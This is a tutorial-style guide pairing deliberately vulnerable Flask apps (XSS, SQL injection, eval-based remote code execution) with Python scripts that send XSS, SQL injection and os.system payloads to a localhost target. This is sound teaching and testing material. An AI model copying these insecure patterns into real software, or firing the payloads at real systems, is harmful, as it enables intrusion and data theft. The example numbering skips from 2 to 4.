Here are three specific examples of security vulnerabilities that can be tested for adversarially, along with sample code or instructions:

1. **Example: Cross-Site Scripting (XSS) Vulnerability**

   - **Description**: Test a web application for vulnerabilities related to Cross-Site Scripting, where an attacker injects malicious scripts into a webpage.
   - **Sample Prompt**: ```Write a simple Flask application that demonstrates cross-site scripting and a python script that tests that application for cross-site scripting vulnerabilities.```
   - **Test Code (Python with Flask)**:

   **vulnerable_app.py:**
   ```python
      from flask import Flask, request, render_template_string
      
      app = Flask(__name__)
      
      @app.route('/', methods=['GET', 'POST'])
      def index():
          name = request.args.get('name', 'Guest')
          template = f'''
          <h1>Welcome, {name}!</h1>
          <form action="/" method="get">
              <input type="text" name="name" placeholder="Enter your name">
              <input type="submit" value="Submit">
          </form>
          '''
          return render_template_string(template)
      
      if __name__ == '__main__':
          app.run(debug=True)
      ```
   This application is vulnerable to XSS because it directly includes user input in the template without any sanitization.
   
   **xss_tester.py:**
   ```python
   import requests
   
   def test_xss(url):
       payloads = [
           "<script>alert('XSS')</script>",
           "<img src=x onerror=alert('XSS')>",
           "<svg onload=alert('XSS')>",
           "javascript:alert('XSS')"
       ]
   
       for payload in payloads:
           response = requests.get(f"{url}?name={payload}")
           if payload in response.text:
               print(f"Potential XSS vulnerability found with payload: {payload}")
           else:
               print(f"No XSS vulnerability detected with payload: {payload}")
   
   if __name__ == '__main__':
       target_url = "http://localhost:5000"
       test_xss(target_url)
   ```
   The tester script will attempt to inject various XSS payloads and report whether they were successful or not.

2. **Example: SQL Injection Vulnerability**

   - **Description**: Test a web application for vulnerabilities related to SQL Injection, where an attacker manipulates input to execute malicious SQL queries.
   - **Sample Prompt**: ```Write a simple web application that demonstrates SQL Injection and a python script that tests that application for SQL Injection vulnerabilities.```
   - **Test Code (Python with Flask and SQLAlchemy)**:

   **app.py:**
   ```python
   from flask import Flask, request, render_template_string
   import sqlite3
   
   app = Flask(__name__)
   
   # Initialize the database
   def init_db():
       conn = sqlite3.connect('users.db')
       c = conn.cursor()
       c.execute('''CREATE TABLE IF NOT EXISTS users
                    (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
       c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'secretpassword')")
       c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (2, 'user', 'userpassword')")
       conn.commit()
       conn.close()
   
   init_db()
   
   @app.route('/', methods=['GET', 'POST'])
   def login():
       error = None
       if request.method == 'POST':
           username = request.form['username']
           password = request.form['password']
           
           # Vulnerable SQL query
           query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
           
           conn = sqlite3.connect('users.db')
           c = conn.cursor()
           c.execute(query)
           user = c.fetchone()
           conn.close()
           
           if user:
               return f"Welcome, {user[1]}!"
           else:
               error = "Invalid credentials"
       
       return render_template_string('''
           <h1>Login</h1>
           {% if error %}
           <p style="color: red;">{{ error }}</p>
           {% endif %}
           <form method="post">
               Username: <input type="text" name="username"><br>
               Password: <input type="password" name="password"><br>
               <input type="submit" value="Login">
           </form>
       ''', error=error)
   
   if __name__ == '__main__':
       app.run(debug=True)
   ```
   This application is vulnerable to SQL Injection because it directly incorporates user input into the SQL query without proper sanitization.

    **test_sql_injection.py:**
   ```python
   import requests
   
   def test_sql_injection(url):
       # Test cases
       payloads = [
           "' OR '1'='1",
           "' OR '1'='1' --",
           "' UNION SELECT 1, username, password FROM users --",
           "admin' --",
           "' OR 1=1 --",
       ]
   
       for payload in payloads:
           data = {
               'username': payload,
               'password': 'anything'
           }
           response = requests.post(url, data=data)
           
           print(f"Payload: {payload}")
           print(f"Response: {response.text}")
           print(f"Status Code: {response.status_code}")
           print("-" * 50)
   
           if "Welcome" in response.text:
               print("SQL Injection vulnerability detected!")
               return True
   
       print("No SQL Injection vulnerability detected.")
       return False
   
   if __name__ == "__main__":
       url = "http://localhost:5000"  # Change this to the URL of your Flask app
       test_sql_injection(url)
   ```
   The testing script will attempt various SQL Injection payloads and report if any vulnerabilities are detected.

4. **Example: Remote Code Execution (RCE) Vulnerability**

   - **Description**: Test a system for vulnerabilities related to Remote Code Execution, where an attacker can execute arbitrary code on a server.
   - **Sample Prompt**: ```Write a simple web application that demonstrates Remote Code Execution and a python script that tests that application for Remote Code Execution vulnerabilities.```
   - **Test Code (Python)**:

   **app.py**:
   ```python
   from flask import Flask, request
   
   app = Flask(__name__)
   
   @app.route("/", methods=["GET"])
   def index():
       return "Hello, World!"
   
   @app.route("/exec", methods=["POST"])
   def exec_code():
       code = request.form["code"]
       result = eval(code)
       return f"Result: {result}"
   
   if __name__ == "__main__":
       app.run()
   ```

   This application has two routes: `/` and `/exec`. The `/` route returns a simple message, while the `/exec` route takes a piece of Python code as input, evaluates it using `eval()`, and returns the result.
   
   **testing.py**
   ```python
   import requests
   
   # Set up the URL and payload for the request
   url = "http://localhost:5000/exec"
   payload = {"code": "__import__('os').system('ls -la')"}
   
   # Make the request and get the response
   response = requests.post(url, data=payload)
   
   # Check if the response contains the expected result
   if "Result: None" in response.text:
       print("Remote Code Execution vulnerability detected!")
   else:
       print("No Remote Code Execution vulnerability detected.")
   ```

   This script makes a POST request to the `/exec` route of the application with a piece of Python code that imports the `os` module and executes the `ls -la` command. If the response contains the expected result (i.e., "Result: None"), then it means that the application is vulnerable to Remote Code Execution attacks.

It's important to note that these examples demonstrate how vulnerabilities can be exploited adversarially. In practice, identifying and mitigating such vulnerabilities is critical to ensuring the security of applications and systems. Security testing should be conducted responsibly and with proper authorization.
